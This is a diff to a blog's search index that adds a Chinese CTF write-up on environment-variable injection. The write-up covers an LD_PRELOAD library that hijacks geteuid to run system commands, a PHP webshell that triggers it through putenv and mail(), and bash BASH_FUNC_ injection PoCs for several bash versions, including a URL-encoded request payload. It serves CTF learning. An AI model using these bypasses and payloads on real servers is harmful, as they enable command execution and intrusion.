@@ -423,4 +423,76 @@ for filename in files:
         <tag>ctf</tag>
       </tags>
   </entry>
+  <entry>
+    <title>环境变量注入</title>
+    <url>/2024/01/02/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h3 id="假设拿到了一个shell但无法执行系统命令"><a href="#假设拿到了一个shell但无法执行系统命令" class="headerlink" title="假设拿到了一个shell但无法执行系统命令"></a>假设拿到了一个shell但无法执行系统命令</h3><p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202401031529213.png"></p>
+<p>这是一个空壳shell，可以通过上传<code>LD_PRELOAD</code>​进行绕过，怎么判断要覆写的函数名？</p>
+<p>可以通过看sh会调用的库函数</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">└─$ sudo readelf -Ws <span class="regexp">/usr/</span>bin/sh</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>挑一个geteuid</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202401031529215.png"></p>
+<p>hacker.c</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/flag &gt;&gt; /var/www/html/test.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成.so文件，</p>
+<blockquote>
+<p>就是将一系列的c函数打包到一个文件中，方便其他二进制文件调用，这样的文件就是so文件，也称动态链接库，相当于windows中的dll文件。</p>
+</blockquote>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hacker.c -o hacker.so</span><br></pre></td></tr></table></figure>
+
+<p>上传so文件到有写入权限的目录下，权限也很玄乎，假如shell写入权限不够就很难利用了，参考羊城杯2023的ez_web，上传目录居然是etc，也考倒了很多</p>
+<p>写入临时webshell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/hacker.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问临时webshell即可成功执行system命令</p>
+<p>当然hacker.c也可以这样子写</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmd = <span class="built_in">getenv</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>临时webshelll</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;CMD=ls&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./hacker.so&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="​​假如没有上传点也没有利用点该怎么触发命令执行​"><a href="#​​假如没有上传点也没有利用点该怎么触发命令执行​" class="headerlink" title="​​假如没有上传点也没有利用点该怎么触发命令执行​"></a>​​假如没有上传点也没有利用点该怎么触发命令执行​</h3><p>如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... 一些其他代码</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>怎么触发命令执行？</p>
+<p>php的system是调用的sh，在centos系统中sh指向bash，在p神的文章中也对比了dash的利用，虽然很鸡肋但是最后还是发现bash可以利用，是因为variables.c的<code>initialize_shell_variables</code>​函数用于将环境变量注册成SHELL的变量</p>
+<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (string_index = <span class="number">0</span>; env &amp;&amp; (<span class="built_in">string</span> = env[string_index++]); ) &#123;</span><br><span class="line">    name = <span class="built_in">string</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (privmode == <span class="number">0</span> &amp;&amp; read_but_dont_execute == <span class="number">0</span> &amp;&amp; </span><br><span class="line">        STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN) &amp;&amp;</span><br><span class="line">        STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN) &amp;&amp;</span><br><span class="line">        STREQN (<span class="string">&quot;() &#123;&quot;</span>, <span class="built_in">string</span>, <span class="number">4</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        size_t namelen;</span><br><span class="line">        char *tname;        <span class="comment">/* desired imported function name */</span></span><br><span class="line"></span><br><span class="line">        namelen = char_index - BASHFUNC_PREFLEN - BASHFUNC_SUFFLEN;</span><br><span class="line"></span><br><span class="line">        tname = name + BASHFUNC_PREFLEN;    <span class="comment">/* start of func name */</span></span><br><span class="line">        tname[namelen] = <span class="string">&#x27;\0&#x27;</span>;      <span class="comment">/* now tname == func name */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">string_length</span> = strlen (<span class="built_in">string</span>);</span><br><span class="line">        temp_string = (char *)xmalloc (namelen + <span class="built_in">string_length</span> + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        memcpy (temp_string, tname, namelen);</span><br><span class="line">        temp_string[namelen] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        memcpy (temp_string + namelen + <span class="number">1</span>, <span class="built_in">string</span>, <span class="built_in">string_length</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t import function names that are invalid identifiers from the</span></span><br><span class="line"><span class="comment">         environment in posix mode, though we still allow them to be defined as</span></span><br><span class="line"><span class="comment">         shell variables. */</span></span><br><span class="line">        <span class="keyword">if</span> (absolute_program (tname) == <span class="number">0</span> &amp;&amp; (posixly_correct == <span class="number">0</span> || legal_identifier (tname)))</span><br><span class="line">            parse_and_execute (temp_string, tname, SEVAL_NONINT|SEVAL_NOHIST|SEVAL_FUNCDEF|SEVAL_ONECMD);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            free (temp_string);     <span class="comment">/* parse_and_execute does this */</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里for遍历了所有环境变量，并用<code>=</code>​分割，<code>name</code>​就是环境变量名，<code>string</code>​是值。</p>
+<p>当满足下面这些条件的情况下，<code>temp_string</code>​将被传入<code>parse_and_execute</code>​执行：</p>
+<ul>
+<li>​<code>privmode == 0</code>​，即不能传入<code>-p</code>​参数</li>
+<li>​<code>read_but_dont_execute == 0</code>​，即不能传入<code>-n</code>​参数</li>
+<li>​<code>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)</code>​，环境变量名前10个字符等于<code>BASH_FUNC_</code>​</li>
+<li>​<code>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)</code>​，环境变量名后两个字符等于<code>%%</code>​</li>
+<li>​<code>STREQN (&quot;() &#123;&quot;, string, 4)</code>​，环境变量的值前4个字符等于<code>() &#123;</code>​</li>
+</ul>
+<p>前两个条件肯定是满足的，后三个条件是用户可控的，所以这个if语句是肯定可以进入的。进入if语句后，去除前缀<code>BASH_FUNC_</code>​和后缀<code>%%</code>​的部分将是一个变量名，而由<code>() &#123;</code>​开头的字符串将会被执行。</p>
+<p>这里其实做的就是一件事：<strong>根据环境变量的值初始化一个匿名函数，并赋予其名字</strong>。</p>
+<p>所以，我们传入下面这样一个环境变量，将会在Bash上下文中添加一个myfunc函数：</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">env</span> $&#x27;BASH_FUNC_myfunc%%=() &#123; id; &#125;<span class="string">&#x27; bash -c &#x27;</span>myfunc<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202401031529216.png"></p>
+<p>centos8下poc为</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">env</span> $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;<span class="string">&#x27; bash -c &#x27;</span>echo hello<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以对于上面的php代码poc为</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?envs[BASH_FUNC_echo<span class="variable">%25</span><span class="variable">%25</span>]<span class="operator">=</span>()<span class="variable">%20</span>&#123;<span class="variable">%20</span>id<span class="comment">;%20&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>centos7（​<code>Bash 4.2</code>​）poc为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&quot;echo hello&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于p神的总结遇到环境变量注入可以这样子尝试</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=() &#123; :; &#125;; <span class="built_in">id</span>;</span><br><span class="line">Bash 4.4以前：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&quot;echo hello&quot;</span></span><br><span class="line">Bash 4.4及以上：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
+<p><a href="https://blog.csdn.net/qq_38154820/article/details/106330120">https://blog.csdn.net/qq_38154820/article/details/106330120</a></p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
 </search>
